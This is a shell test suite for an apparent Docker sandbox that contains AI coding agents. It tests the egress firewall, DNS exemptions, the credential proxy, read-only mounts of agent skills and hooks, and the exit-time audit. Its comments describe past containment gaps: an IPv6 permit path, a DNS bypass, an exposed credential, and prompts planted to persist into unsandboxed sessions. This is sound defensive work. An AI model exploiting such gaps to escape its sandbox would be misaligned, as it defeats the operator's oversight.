    # And a bound, so a resolver that never answers fails loudly rather than
    # hanging a container start forever.
    grep -q 'did not answer' <<< "$block" \
        || { echo "the wait has no bound, so a dead resolver hangs the start"; return 1; }
}

@test "the positive self-checks retry and the negative controls do not" {
    # A check asserting something CAN be reached is answered wrongly by a
    # transient failure - a lookup that did not come back, a CDN edge rotating
    # mid-boot - and wrongly in the direction that stops the container. One
    # container failed that way while a dozen others in the same CI run came up
    # fine, which is the whole reason this asymmetry exists.
    #
    # The negative controls must never be retried. There a single success is
    # the real answer, and retrying is asking until it says what we want.
    local p="$SANDBOX_DIR/egress-policy" v
    v=$(sed -n '/^verify()/,/^}/p' "$p")

    # Reachability and the forge's own lookup: retried.
    grep -q 'retry_positive [0-9]* resolve_one' <<< "$v" \
        || { echo "the permitted-name lookup is not retried"; return 1; }
    grep -q 'retry_positive [0-9]* curl' <<< "$v" \
        || { echo "the reachability check is not retried"; return 1; }

    # The negatives: not.
    local line
    while IFS= read -r line; do
        case "$line" in
            *retry_positive*) echo "a negative control is retried: $line"; return 1 ;;
        esac
    done < <(grep -E 'verify_refused|verify_port_refused|verify_ipv6_refused|PROBE_NAME\)' <<< "$v")

    # And the lookup has to report emptiness, or retrying it is a no-op: it
    # returns 0 whether or not it found an address otherwise.
    local r
    r=$(sed -n '/^resolve_one()/,/^}/p' "$p")
    [ "$(grep -c 'return 1' <<< "$r")" -ge 1 ] \
        || { echo "resolve_one cannot signal 'no address', so retrying it does nothing"; return 1; }
}

@test "a retried check reports the status the command actually returned" {
    # The failure this retry was written for was diagnosed by the exit code:
    # 28 is a timeout, 7 is a refusal, and only the first means the network
    # rather than the policy. A retry that swallows it and returns a bare 1
    # leaves the message stating a code curl never returns, which is worse than
    # saying nothing.
    local block
    block=$(sed -n '/^retry_positive()/,/^}/p' "$SANDBOX_DIR/egress-policy")
    grep -q 'return "\$rc"' <<< "$block" \
        || { echo "retry_positive returns a literal rather than the command's status"; return 1; }
    grep -qE '^\s*"\$@" \|\| rc=\$\?' <<< "$block" \
        || { echo "the status is discarded by an if, so there is none to return"; return 1; }

    # Driven, because the shape is easy to get right and the behaviour is what
    # matters.
    run bash -c '
        set -uo pipefail
        say() { :; }
        eval "$(sed -n "/^retry_positive()/,/^}/p" "$1")"
        t() { return 28; }
        rc=0; retry_positive 2 t || rc=$?
        printf "%s" "$rc"
    ' _ "$SANDBOX_DIR/egress-policy"
    [ "$output" = "28" ] \
        || { echo "a command exiting 28 was reported as $output"; return 1; }
}



@test "IPv6 is refused as a family, with no permit path anywhere in the ruleset" {
    # dejima has no IPv6 egress, deliberately. This test used to require the
    # opposite - it failed if the chain had no `ip6 daddr` rules - which is how
    # a branch came to allow-list the family and stay green.
    local p="$SANDBOX_DIR/egress-policy" chain
    chain=$(sed -n '/chain egress {/,/^  }/p' "$p")

    grep -q 'meta nfproto ipv6' <<< "$chain" \
        || { echo "the egress chain does not refuse IPv6"; return 1; }
    # First, because a refusal under the established or loopback passes is one
    # a v6 packet can get past: loopback carries ::1, and a flow permitted once
    # stays permitted.
    local first
    first=$(grep -vE '^\s*(#|$|chain |type filter hook)' <<< "$chain" | head -1)
    [[ "$first" == *"meta nfproto ipv6"* ]] \
        || { echo "the v6 refusal is not the first rule: $first"; return 1; }

    # And no v6 destination is named anywhere in the generated ruleset - not
    # just the egress chain, since a set or an inbound accept would do it too.
    #
    # Comment lines are excluded, and have to be: the check that enforces this
    # at runtime explains itself by quoting the rule that regressed last time,
    # which is exactly the kind of fact .dejima.md asks to be kept. A rule the
    # script emits never begins with a '#', so nothing real hides behind this.
    local permits
    permits=$(grep -nE '(ip6 |_v6|ipv6_addr)' "$p" \
        | grep -v 'nfproto ipv6' \
        | grep -vE '^[0-9]+: *#' || true)
    [ -z "$permits" ] \
        || { echo "IPv6 destinations are still named in the ruleset:"; echo "$permits"; return 1; }

    # The resolver is the second layer: an address never handed out cannot
    # become a packet to refuse.
    grep -qE '^filter-AAAA$' "$p" \
        || { echo "the resolver can still hand out AAAA answers"; return 1; }
    grep -q '6#inet#' "$p" \
        && { echo "AAAA answers are still written into an address set"; return 1; }

    # Checked at startup rather than assumed, and checked on the ruleset rather
    # than by a connection: a v6 connection fails the same way on a host with
    # no v6 route, so a probe alone cannot tell refusal from absence.
    grep -q 'verify_ipv6_refused' "$p" \
        || { echo "nothing verifies the v6 posture at startup"; return 1; }
}

@test "inbound and forwarded traffic default to drop, like outbound" {
    # The firewall this replaced set INPUT and FORWARD to DROP, in both address
    # families, and the replacement's first version had only an output hook -
    # so a session process binding 0.0.0.0 became reachable from the bridge,
    # where it had not been. Nothing about the launcher's one-network-per-pair
    # arrangement is what makes that safe; this is.
    local p="$SANDBOX_DIR/egress-policy" chain
    for chain in inbound forwarding; do
        grep -qE "^  chain $chain \{$" "$p" \
            || { echo "there is no $chain chain in the generated ruleset"; return 1; }
    done
    grep -q 'type filter hook input priority filter; policy drop;' "$p" \
        || { echo "the input hook does not default to drop"; return 1; }
    grep -q 'type filter hook forward priority filter; policy drop;' "$p" \
        || { echo "the forward hook does not default to drop"; return 1; }

    # Replies to what the session legitimately started, and loopback, which is
    # where the resolver and the credential forwarder both listen.
    local block
    block=$(sed -n '/chain inbound {/,/^  }/p' "$p")
    grep -q 'ct state established,related' <<< "$block" \
        || { echo "inbound replies are dropped, so nothing the session starts can answer"; return 1; }
    grep -q 'iifname "lo"' <<< "$block" \
        || { echo "loopback is dropped, so the resolver and the forwarder are unreachable"; return 1; }
    grep -q 'ip saddr @host_v4' <<< "$block" \
        || { echo "the container's own host cannot reach it, which it could before"; return 1; }

    # And all three defaults are checked after loading, not just the outbound
    # one - a chain that failed to come up closed is the case this is about.
    grep -q 'for name in egress inbound forwarding' "$p" \
        || { echo "the self-check does not verify every chain's default"; return 1; }
}

@test "a declared internal destination is exempted from the answer check, and not permitted by it" {
    # The key exempts; it does not grant. A name listed there and approved
    # nowhere is not reachable, and saying so is the launch's job rather than
    # something for an operator to discover as a destination that quietly does
    # not work.
    local up="$SANDBOX_DIR/firewall-up.sh"
    grep -q 'dejima_mark_internal "$_domain"' "$up" \
        || { echo "internal_domains no longer goes through the exempt-only path"; return 1; }
    grep -q 'dejima_permit_open "$_domain" internal' "$up" \
        && { echo "internal_domains grants as well as exempts again"; return 1; }
    grep -q 'names destinations nothing permits' "$up" \
        || { echo "an entry nothing permits is accepted silently"; return 1; }

    # Driven, not just grepped: the two functions have to actually behave that
    # way, since the difference between them is the whole finding.
    run bash -c '
        set -euo pipefail
        source "$1"
        dejima_mark_internal registry.npmjs.org || echo "REFUSED-KNOWN"
        dejima_mark_internal nothing.permits.this || echo "REFUSED-UNKNOWN"
        printf "open:%s\n" "${DEJIMA_OPEN_CLASS[*]}"
        printf "internal:%s\n" "${DEJIMA_INTERNAL_CLASS[*]:-}"
    ' _ "$SANDBOX_DIR/fixed-domains.sh"
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [[ "$output" != *"REFUSED-KNOWN"* ]] \
        || { echo "an already-permitted name could not be exempted"; return 1; }
    [[ "$output" == *"REFUSED-UNKNOWN"* ]] \
        || { echo "an unpermitted name was exempted"; return 1; }
    [[ "$output" == *"internal:registry.npmjs.org"* ]] \
        || { echo "the exemption did not take: $output"; return 1; }
    [[ "$output" != *"nothing.permits.this"* ]] \
        || { echo "an unpermitted name reached a class: $output"; return 1; }
}

@test "a self-served model's host is permitted and exempted like the forge and Loki" {
    # Where a self-hosted backend lives comes from [backend.<name>] base_url -
    # the operator's own configuration, the same class of value as the forge's
    # hosts and Loki's URL. So it gets the same treatment: permitted, and
    # exempt from the check that refuses an answer pointing inside a private
    # network, because they configured the address and there is nothing for an
    # answer to decide.
    #
    # Without this the endpoint is reachable only if its name is ALSO approved
    # as a domain, at which point it is indistinguishable from a public name
    # nobody reviewed - and a self-served model on the operator's own network
    # then fails the answer check and stops the launch. That is how it
    # presented.
    grep -q 'dejima_permit_open "${DEJIMA_BACKEND_HOST:-}" internal' "$SANDBOX_DIR/firewall-up.sh" \
        || { echo "a self-served backend's host is not permitted-and-exempted"; return 1; }

    # Derived from the URL host-side, with any scheme and port stripped, so the
    # container is given a name and not a URL.
    grep -q 'DEJIMA_BACKEND_HOST=' "$REPO_ROOT/bin/dejima" \
        || { echo "bin/dejima never derives the backend host"; return 1; }
    run bash -c 'printf "%s" "$1" | sed -E "s#^[a-zA-Z]+://##; s#[:/].*##"' _ \
        'https://llm.example.test:8443/v1'
    [ "$output" = "llm.example.test" ] \
        || { echo "the host derivation does not strip scheme and port: $output"; return 1; }

    # Only backends that have one - every proxied backend leaves it empty, and
    # an empty entry must be ignored rather than permitted.
    run bash -c '
        set -euo pipefail
        source "$1"
        before="${#DEJIMA_OPEN_CLASS[@]}"
        dejima_permit_open "" internal
        [ "${#DEJIMA_OPEN_CLASS[@]}" -eq "$before" ] || { echo "GREW"; exit 1; }
        printf "internal:%s\n" "${DEJIMA_INTERNAL_CLASS[*]:-}"
    ' _ "$SANDBOX_DIR/fixed-domains.sh"
    [ "$status" -eq 0 ] || { echo "an empty backend host was permitted: $output"; return 1; }
    [ "$output" = "internal:" ] \
        || { echo "an empty backend host reached the exemption list: $output"; return 1; }
}

@test "no backend is both proxied and self-served" {
    # The exemption above is safe because the two are disjoint: a backend
    # dejima proxies has a proxied_domain and no base_url, so its host is never
    # permitted-and-exempted. A backend declaring both would be proxied AND
    # have its host exempted, which re-opens the DNS bypass that leaving a
    # proxied name unresolvable exists to close, and hands a public SaaS name
    # the exemption fixed-domains.sh withholds from it on purpose.
    #
    # bin/dejima guards it at the point of use; this is the other end, so a
    # future backend that legitimately needs both has to come and change this
    # deliberately rather than inheriting an exemption nobody meant to grant.
    local f name
    for f in "$REPO_ROOT"/backends/*/backend.conf; do
        name="$(basename "$(dirname "$f")")"
        if grep -qE '^keys[[:space:]]*=.*base_url' "$f" \
            && grep -qE '^proxied_domain[[:space:]]*=' "$f"; then
            echo "backend '$name' declares both base_url and proxied_domain" >&2
            return 1
        fi
    done

    # And the guard itself, so removing it fails here rather than silently.
    grep -q 'if \[ -z "$SANDBOX_BACKEND_PROXIED_DOMAIN" \]' "$REPO_ROOT/bin/dejima" \
        || { echo "bin/dejima no longer withholds the host from a proxied backend"; return 1; }
}

@test "a declared internal destination becomes an exemption the resolver and the filter both honour" {
    # Two layers, because the check is stated twice on purpose. The resolver
    # must stop refusing the answer, and the packet filter must stop refusing
    # the address - an exemption that only reached one of them would leave the
    # destination configured and unreachable.
    local p="$SANDBOX_DIR/egress-policy"
    grep -q 'rebind-domain-ok=/%s/' "$p" \
        || { echo "an exempted name gets no resolver-side exemption"; return 1; }
    grep -q 'internal_ok_v4' "$p" \
        || { echo "an exempted name gets no filter-side exemption"; return 1; }
    # The exemption reaches the filter by the resolver writing the answer into
    # a second set, appended to the class set the entry already feeds. v4 only:
    # IPv6 is refused as a family, so there is no v6 set to exempt into.
    grep -q 'sets="\$sets,4#inet#\$TABLE#internal_ok_v4"' "$p" \
        || { echo "the exempt set is not fed from the entry"; return 1; }
    grep -q 'ip daddr != @internal_ok_v4 goto refuse' "$p" \
        || { echo "the filter's own guard does not consult the exemption"; return 1; }
}

@test "~/.claude skills/commands/agents/output-styles are mounted read-only" {
    # Same persistence-path rationale as the hooks mount: these carry
    # executable skill scripts / injectable command, agent, and output-style
    # prompts that a later unsandboxed host session would run or load.
    # Read-only, and pre-created by bin/dejima since existence is what lets
    # Docker mount them at all.
    local dirs d
    dirs="$(_declared_config_dirs)"
    for d in skills commands agents output-styles; do
        grep -q "^/h/.claude/$d"$'\t'"ro" <<< "$dirs" \
            || { echo "$d is not declared read-only: $dirs"; return 1; }
    done
}

@test "bin/dejima pre-creates every enumerated ~/.claude mount source" {
    # Docker answers a missing bind source by creating a root-owned directory
    # in its place - on the host for the source, and at the destination for
    # the code-carrying dirs, which would leave a session with no skills or
    # hooks and junk on the host either way.
    # Every declared config directory is created before its mount is set up,
    # by one loop over the declarations rather than a list that could fall
    # out of step with what is mounted.
    grep -q 'mkdir -p "$_cdir"' "$REPO_ROOT/bin/dejima"
    grep -q 'harness_config_dirs_load' "$REPO_ROOT/bin/dejima"
    # And the two the state hook mounts an entry at a time, whose parents it
    # creates itself.
    grep -q 'mkdir -p "$projects/$(ws_slug "$ws")"' "$REPO_ROOT/bin/harness/claude-code.sh"
    grep -q 'mkdir -p "$history"' "$REPO_ROOT/bin/harness/claude-code.sh"
    # The set itself, so a directory silently dropped from the declaration
    # fails here rather than presenting as a missing skill in a session.
    local dirs d
    dirs="$(_declared_config_dirs)"
    for d in skills commands agents output-styles hooks \
             backups tasks plans sessions; do
        grep -q "^/h/.claude/$d"$'\t' <<< "$dirs" \
            || { echo "$d is no longer declared: $dirs"; return 1; }
    done
    # plugins/ is deliberately not among them: it is seeded as a writable copy
    # rather than mounted, so entrypoint.sh creates it and there is no mount
    # source for bin/dejima to pre-create.
    grep -q "^/h/.claude/plugins"$'\t' <<< "$dirs" \
        && { echo "plugins is a config-dir mount again: $dirs"; return 1; }
    return 0
}

@test "bin/dejima overlays the workspace .git/hooks read-only when .git is a real dir" {
    grep -q 'if \[ -d "$WORKSPACE_DIR/.git/hooks" \]' "$REPO_ROOT/bin/dejima"
    grep -q 'extra_mounts+=(-v "$WORKSPACE_DIR/.git/hooks:$WORKSPACE_DIR/.git/hooks:ro")' "$REPO_ROOT/bin/dejima"
}

@test "bin/dejima reads allowed domains only from the approval store" {
    [ ! -e "$REPO_ROOT/config/env" ]
    [ ! -e "$REPO_ROOT/bin/dejima-env.sh" ]
    run grep -n 'config/env\|dejima-env' "$REPO_ROOT/bin/dejima"
    [ "$status" -ne 0 ]
    grep -q 'ALLOWED_DOMAINS="$(approved_entries "$(config_root)" allowed-domains' "$REPO_ROOT/bin/dejima"
}

@test "bin/dejima snapshots before the run and compares after" {
    grep -q '"$SCRIPT_DIR/dejima-audit" snapshot "$WORKSPACE_DIR"' "$REPO_ROOT/bin/dejima"
    grep -q '"$SCRIPT_DIR/dejima-audit" compare "$WORKSPACE_DIR"' "$REPO_ROOT/bin/dejima"
}

@test "bin/dejima warns when the workspace is this repo itself (TCB self-mount)" {
    grep -q 'sandbox.s own repo' "$REPO_ROOT/bin/dejima" || \
    grep -q 'TCB' "$REPO_ROOT/bin/dejima"
}

@test "compose carries the credential-proxy env plumbing, empty by default" {
    grep -qE '^\s*ANTHROPIC_BASE_URL:\s*\$\{SANDBOX_ANTHROPIC_BASE_URL:-\}\s*$' "$SANDBOX_DIR/docker-compose.yml"
    grep -qE '^\s*ANTHROPIC_AUTH_TOKEN:\s*\$\{SANDBOX_ANTHROPIC_AUTH_TOKEN:-\}\s*$' "$SANDBOX_DIR/docker-compose.yml"
    grep -qE '^\s*SANDBOX_CREDENTIAL_PROXY_SOCKET:\s*\$\{SANDBOX_CREDENTIAL_PROXY_SOCKET:-\}\s*$' "$SANDBOX_DIR/docker-compose.yml"
}

@test "the forwarder is baked into the image and started by the entrypoint when a socket is set" {
    grep -q 'COPY docker/credential-proxy-forwarder.js /usr/local/bin/credential-proxy-forwarder.js' "$SANDBOX_DIR/Dockerfile"
    grep -q 'if \[ -n "\${SANDBOX_CREDENTIAL_PROXY_SOCKET:-}" \]' "$SANDBOX_DIR/entrypoint.sh"
    grep -q 'gosu "\$SANDBOX_USER" node /usr/local/bin/credential-proxy-forwarder.js' "$SANDBOX_DIR/entrypoint.sh"
}

@test "entrypoint unsets empty ANTHROPIC_* vars so a disabled proxy changes nothing" {
    grep -q 'unset ANTHROPIC_BASE_URL' "$SANDBOX_DIR/entrypoint.sh"
    grep -q 'unset ANTHROPIC_AUTH_TOKEN' "$SANDBOX_DIR/entrypoint.sh"
}

@test "bin/dejima's exit-time audit still runs when the container run fails or is interrupted" {
    local run_line trap_line
    # The EARLIEST run, because there are two now - one for a terminal and
    # one without - and the trap has to precede both. Taking the last would
    # let a run creep in above the trap and still pass.
    run_line=$(grep -n 'docker compose .* run --rm' "$REPO_ROOT/bin/dejima" | head -1 | cut -d: -f1)
    trap_line=$(grep -n '^trap cleanup EXIT' "$REPO_ROOT/bin/dejima" | head -1 | cut -d: -f1)
    [ -n "$run_line" ]
    [ -n "$trap_line" ]
    # cleanup() is installed as the EXIT trap before the compose run, so it
    # fires - and runs the audit - on every exit from the run below,
    # including a nonzero/interrupted one under set -e that would otherwise
    # abort the script before a bare audit call placed after the run ever
    # ran.
    [ "$trap_line" -lt "$run_line" ]
    sed -n "1,${trap_line}p" "$REPO_ROOT/bin/dejima" | grep -q '"\$SCRIPT_DIR/dejima-audit" compare "\$WORKSPACE_DIR"'
    # No compose invocation may be a bare command under set -e either - a
    # nonzero or interrupted exit there would skip the credential-proxy check
    # and the propagated exit code below it.
    #
    # Two spellings satisfy that and both are checked, because there are two
    # runs: the no-terminal one takes `|| compose_status=$?`, and the one that
    # supports Ctrl-Z is backgrounded, where the status comes from a guarded
    # `wait` instead (see the SIGTSTP handling above it). What matters is that
    # neither can abort the script, not which form says so.
    local line
    while IFS= read -r line; do
        case "$line" in
            *"|| compose_status=\$?"*) ;;
            *"sandbox \"\$@\" < /dev/tty &"*) ;;
            *) echo "an unguarded compose run: $line"; return 1 ;;
        esac
    done < <(grep 'docker compose .* run --rm' "$REPO_ROOT/bin/dejima")
    grep -q 'if wait "\$SANDBOX_CLIENT_PID"; then' "$REPO_ROOT/bin/dejima" \
        || { echo "the backgrounded run's status is no longer captured from a guarded wait"; return 1; }
    sed -n "1,${run_line}p" "$REPO_ROOT/bin/dejima" | grep -q 'compose_status=0'
    tail -n "+$run_line" "$REPO_ROOT/bin/dejima" | grep -q 'exit "\$compose_status"'
}

# --- Task 10: the exit-time audit is the structural last writer ---

@test "the exit-time audit is the last thing that writes to the terminal" {
    audit_line=$(grep -n 'dejima-audit" compare' "$REPO_ROOT/bin/dejima" | head -1 | cut -d: -f1)
    trap_line=$(grep -n '^trap cleanup EXIT' "$REPO_ROOT/bin/dejima" | head -1 | cut -d: -f1)
    marker_line=$(grep -n 'could not remove the marker directory' "$REPO_ROOT/bin/dejima" | head -1 | cut -d: -f1)
    epitaph_line=$(grep -n 'dejima-epitaph" save' "$REPO_ROOT/bin/dejima" | head -1 | cut -d: -f1)
    [ -n "$marker_line" ]
    [ -n "$epitaph_line" ]
    [ "$audit_line" -lt "$trap_line" ]
    # Not just "inside cleanup()" but after the one line in it a session can
    # deliberately provoke to print - the actual last-writer invariant.
    [ "$marker_line" -lt "$audit_line" ]
    # Same invariant, for the other task in the trap that prints: epitaph
    # announces every summary it keeps, so it goes before the verdict.
    [ "$epitaph_line" -lt "$audit_line" ]
    run grep -c 'could not remove the marker directory' "$REPO_ROOT/bin/dejima"
    [ "$output" -eq 1 ]
}

@test "cleanup says what it is doing before each task that takes a while" {
    # A silent terminal between the container exiting and the prompt
    # returning reads as a hung one, and the operator's answer to that is
    # Ctrl-C - during the audit, which is the worst moment for it.
    local d="$REPO_ROOT/bin/dejima" start s1 epi s2 aud
    # Absolute line numbers, so each announcement is checked to sit with the
    # task it names rather than merely somewhere in the same function. The
    # definition of exit_step() itself is above cleanup() and so is skipped.
    start=$(grep -n '^cleanup() {' "$d" | cut -d: -f1)
    epi=$(grep -n 'dejima-epitaph" save' "$d" | head -1 | cut -d: -f1)
    aud=$(grep -n 'dejima-audit" compare' "$d" | head -1 | cut -d: -f1)
    s1=$(awk -v s="$start" 'NR>s && /exit_step /{print NR; exit}' "$d")
    s2=$(awk -v s="$epi" 'NR>s && /exit_step /{print NR; exit}' "$d")
    [ -n "$s1" ] && [ -n "$s2" ] || { echo "no announcement before a task"; return 1; }
    [ "$s1" -lt "$epi" ] || { echo "epitaph runs unannounced"; return 1; }
    [ "$s2" -lt "$aud" ] || { echo "the audit runs unannounced"; return 1; }
    # Gated on the snapshot, the same condition `compare` uses to decide it
    # has work: an exit before the session started is instant, and its last
    # line is the error that caused it - which announcements would bury.
    run sed -n '/^exit_step() {/,/^}/p' "$REPO_ROOT/bin/dejima"
    [ -n "$output" ] || { echo "exit_step is not defined"; return 1; }
    grep -q 'SANDBOX_AUDIT_STATE' <<< "$output"
    # A nonzero status from anything in an EXIT trap replaces the script's.
    grep -q 'return 0' <<< "$output"
}

@test "credential proxy is on by default, and unset per backend means inherit" {
    grep -Pq 'credentials\.proxy\tbool\ton' "$REPO_ROOT/bin/dejima-config-lib.sh"
    # Every gate goes through the helper. A raw config_get_bool read here
    # would ignore [backend.<name>] proxy and re-widen the switch to every
    # backend at once.
    grep -q 'backend_proxy_enabled' "$REPO_ROOT/bin/dejima"
    grep -q 'backend_proxy_enabled' "$REPO_ROOT/bin/harness/cline.sh"
    run grep -rn 'config_get_bool credentials proxy' "$REPO_ROOT/bin" "$REPO_ROOT/docker"
    [ -z "$output" ] || { echo "an ungated read of the global switch: $output"; return 1; }
    # And the helper must not be config_get_bool underneath, which reports an
    # unset optional key as off - that would turn the proxy off for every
    # backend the moment the per-backend key existed.
    run sed -n '/^backend_proxy_enabled() {/,/^}/p' "$REPO_ROOT/bin/dejima-provider-lib.sh"
    [ -n "$output" ] || { echo "backend_proxy_enabled is not defined"; return 1; }
    grep -q 'config_get_bool' <<< "$output" \
        && { echo "the helper reads an unset key as off"; return 1; }
    grep -q 'config_get credentials proxy' <<< "$output" \
        || { echo "the helper does not fall back to the global switch"; return 1; }
}

@test "bin/dejima mounts the proxy socket dir and masks nothing" {
    # The socket dir is how API traffic gets back out to the host-side proxy
    # that holds the real credential. The credential itself, and the
    # .credentials-proxy-tmp staging directory the proxy writes rotated
    # tokens through, used to be covered by empty-file/-directory masks
    # mounted into the read-write ~/.claude mount. That was #50: the proxy's
    # own write-back renamed the credential out from under its mask,
    # detaching it and exposing the real token from the first refresh on.
    # Neither path is mounted at all now, so there is nothing left to mask -
    # the fake credential the tls transport mounts (see below) is a file the
    # container would otherwise not have, not a mask over the operator's.
    grep -q 'extra_mounts+=(-v "\$SANDBOX_CREDENTIAL_PROXY_DIR:\$SANDBOX_CREDENTIAL_PROXY_DIR:ro")' "$REPO_ROOT/bin/dejima"
    run grep -n 'CREDENTIALS_MASK_FILE\|CREDENTIALS_TMPDIR_MASK\|dejima-credentials-mask\|dejima-credentials-tmpdir-mask' "$REPO_ROOT/bin/dejima"
    [ "$status" -ne 0 ]
}

@test "bin/dejima mounts the real credential only when the proxy is off" {
    # With ~/.claude no longer mounted as a whole, the documented
    # SANDBOX_CREDENTIAL_PROXY=0 downgrade no longer gets the credential for
    # free - it has to be stated. Read-write, because Claude Code refreshes
    # it in place. The only mount of it anywhere, and it sits under the
    # proxy-disabled branch.
    run grep -c 'extra_mounts+=(-v "\$HOME/\.claude/\.credentials\.json:\$HOME/\.claude/\.credentials\.json")' "$REPO_ROOT/bin/dejima"
    [ "$output" = "1" ]
    local mount_line branch_line
    mount_line=$(grep -n 'extra_mounts+=(-v "\$HOME/\.claude/\.credentials\.json' "$REPO_ROOT/bin/dejima" | cut -d: -f1)
    branch_line=$(grep -n 'elif \[ -f "\$HOME/\.claude/\.credentials\.json" \]; then' "$REPO_ROOT/bin/dejima" | cut -d: -f1)
    [ -n "$branch_line" ]
    [ "$branch_line" -lt "$mount_line" ]
}

@test "the container gets an empty credentials file of its own" {
    # A harness should not have to be trusted to treat an absent credentials
    # file the same as an empty one. It comes from that harness's own image
    # layer rather than from entrypoint.sh - see "a file a harness needs
    # seeded is declared" - and a mount at the same path shadows it, which is
    # what keeps it from clobbering either of the credentials bin/dejima does
    # mount: the fake one under the tls transport, the real one under
    # [credentials] proxy = off.
    _harness_declares_file .claude/.credentials.json \
        || { echo "the harness declares no credentials file"; return 1; }
    # Shadowing only works if the mount is at the same path the layer created.
    grep -q '\.credentials\.json' "$SANDBOX_DIR/docker-compose.yml" \
        || grep -q '\.credentials\.json' "$REPO_ROOT/bin/dejima" \
        || { echo "nothing ever mounts a credential over it"; return 1; }
}

@test "bin/dejima refuses to launch when the proxy fails to start" {
    # Falling back to mounting the real credential would be a silent
    # security downgrade - the failure must be loud and the launch aborted.
    grep -q 'Credential proxy failed to start' "$REPO_ROOT/bin/dejima"
    grep -q '\[credentials\] proxy = off' "$REPO_ROOT/bin/dejima"
}

@test "cleanup reaps the proxy and its socket dir" {
    grep -q 'kill "\$SANDBOX_CREDENTIAL_PROXY_PID"' "$REPO_ROOT/bin/dejima"
    grep -q '"\${SANDBOX_CREDENTIAL_PROXY_DIR:-}"' "$REPO_ROOT/bin/dejima"
}

@test "bin/dejima warns if the proxy died before the session ended" {
    grep -q 'credential proxy exited before' "$REPO_ROOT/bin/dejima"
}

@test "docker-compose.yml pins the compose project name so dejima-allow's label filter matches" {
    # bin/dejima-allow discovers running sandboxes via the
    # com.docker.compose.project=dejima label; without an explicit
    # top-level name, compose derives the project from the compose file's
    # directory ("docker"), which varies by checkout and breaks discovery.
    grep -qE '^name: dejima\s*$' "$SANDBOX_DIR/docker-compose.yml"
}

@test "a briefing bigger than a hook can carry does not go through one" {
    # Measured in a dejima container: a SessionStart payload of 9KB arrived
    # whole, one of 21KB was persisted to a file and replaced with a ~2KB
    # preview. A composed briefing plus a project's own .dejima.md is
    # comfortably past that, so most of the briefing silently never reached
    # the session - the briefing failing in the quietest way available to it.
    #
    # Claude Code takes it as a system prompt instead: no size limit, and a
    # compaction cannot reach it either.
    run lib manifest_get harness claude-code briefing_args
    [ -n "$output" ] || { echo "claude-code declares no briefing_args"; return 1; }
    grep -q 'DEJIMA_BRIEFING_VIA_ARGS' "$REPO_ROOT/hooks/sandbox-context.sh"
    grep -q 'DEJIMA_BRIEFING_VIA_ARGS' "$REPO_ROOT/docker/entrypoint.sh"
}

@test "the hook carries only the session id once the briefing goes by argument" {
    # The one fact the entrypoint could not put in the system prompt, because
    # the harness had not started and the id did not exist yet.
    local out
    out=$(printf '{"session_id":"sess-abc","cwd":"%s"}' "$BATS_TEST_TMPDIR" \
        | DEJIMA=1 DEJIMA_BRIEFING_VIA_ARGS=1 bash "$REPO_ROOT/hooks/sandbox-context.sh")
    run jq -r '.hookSpecificOutput.additionalContext' <<< "$out"
    [[ "$output" == *"sess-abc"* ]] || { echo "the session id is missing: $output"; return 1; }
    # Short. Duplicating the briefing here would spend the context window on a
    # truncated copy of something already present in full.
    [ "${#output}" -lt 400 ] || { echo "the hook still carries a briefing (${#output} bytes)"; return 1; }
}

@test "the hook still carries the whole briefing when nothing else does" {
    # The fallback route, and the one every harness has until it declares
    # otherwise. Without it a harness with no briefing_args gets nothing.
    local ws out
    ws="$(mktemp -d "$BATS_TEST_TMPDIR/ws.XXXXXX")"
    printf 'BRIEFING-SENTINEL\n' > "$BATS_TEST_TMPDIR/briefing"
    out=$(printf '{"session_id":"s1","cwd":"%s"}' "$ws" \
        | sandbox_context DEJIMA_BRIEFING_FILE="$BATS_TEST_TMPDIR/briefing")
    run jq -r '.hookSpecificOutput.additionalContext' <<< "$out"
    [[ "$output" == *"BRIEFING-SENTINEL"* ]] \
        || { echo "the briefing did not come through the hook: $output"; return 1; }
}

@test "the wrapper passes the briefing as one argument, not word-split" {
    # It is prose, unlike every other value the wrapper forwards. Split on
    # whitespace it would arrive as a few hundred arguments and the harness
    # would reject the call.
    local d; d="$(mktemp -d "$BATS_TEST_TMPDIR/wrap.XXXXXX")"
    printf 'first line\nsecond line with spaces\n' > "$d/rendered"
    printf '#!/bin/bash\nprintf "%%s\\n" "$#"\nprintf "[%%s]\\n" "$@"\n' > "$d/fake"
    chmod +x "$d/fake"
    run env SANDBOX_HARNESS_REAL="$d/fake" SANDBOX_HARNESS_ARGS= SANDBOX_HARNESS_SETTINGS= \
        SANDBOX_HARNESS_BRIEFING_ARGS=--append-system-prompt \
        DEJIMA_BRIEFING_RENDERED="$d/rendered" \
        bash "$REPO_ROOT/docker/harness-wrapper.sh"
    [ "$(head -1 <<< "$output")" = "2" ] \
        || { echo "expected a flag and one value, got: $output"; return 1; }
    [[ "$output" == *"second line with spaces"* ]] \
        || { echo "the briefing did not survive: $output"; return 1; }
}

@test "a container started without dejima still runs its harness" {
    # test/runtime.bats boots the image directly, so nothing renders a
    # briefing and the file the wrapper would read is absent. The flag has to
    # drop out rather than being passed with an empty value or a missing path.
    local d; d="$(mktemp -d "$BATS_TEST_TMPDIR/wrap2.XXXXXX")"
    printf '#!/bin/bash\nprintf "%%s\\n" "$#"\n' > "$d/fake"
    chmod +x "$d/fake"
    run env SANDBOX_HARNESS_REAL="$d/fake" SANDBOX_HARNESS_ARGS= SANDBOX_HARNESS_SETTINGS= \
        SANDBOX_HARNESS_BRIEFING_ARGS=--append-system-prompt \
        DEJIMA_BRIEFING_RENDERED="$d/absent" \
        bash "$REPO_ROOT/docker/harness-wrapper.sh"
    [ "$output" = "0" ] || { echo "expected no arguments, got: $output"; return 1; }
}

@test "the briefing renderer is baked into the image, not reached through ~/.claude" {
    # A harness reaches this through the image, not through Claude Code's
    # config mount - entrypoint.sh runs it before any harness starts, and a
    # harness with no ~/.claude has no hooks mount to find it in.
    grep -q 'COPY hooks/dejima-briefing-render.sh /usr/local/lib/dejima/' "$REPO_ROOT/docker/Dockerfile"
    grep -q '/usr/local/lib/dejima/dejima-briefing-render.sh' "$REPO_ROOT/docker/entrypoint.sh"
    grep -q 'dejima-briefing-render.sh' "$REPO_ROOT/hooks/sandbox-context.sh"
}

@test "a failed briefing render stops the session rather than starting one blind" {
    # The one failure the briefing cannot absorb. A session that starts without
    # it does not know the firewall is load-bearing for it, does not know what
    # is disposable, and has no dejima-allow instructions.
    run bash -c 'sed -n "/could not render the session briefing/,+4p" "$1"' _ \
        "$REPO_ROOT/docker/entrypoint.sh"
    [[ "$output" == *"exit 1"* ]] || { echo "a render failure does not stop the launch: $output"; return 1; }
}

# hooks/sandbox-context.sh, with the briefing-delivery variables cleared.
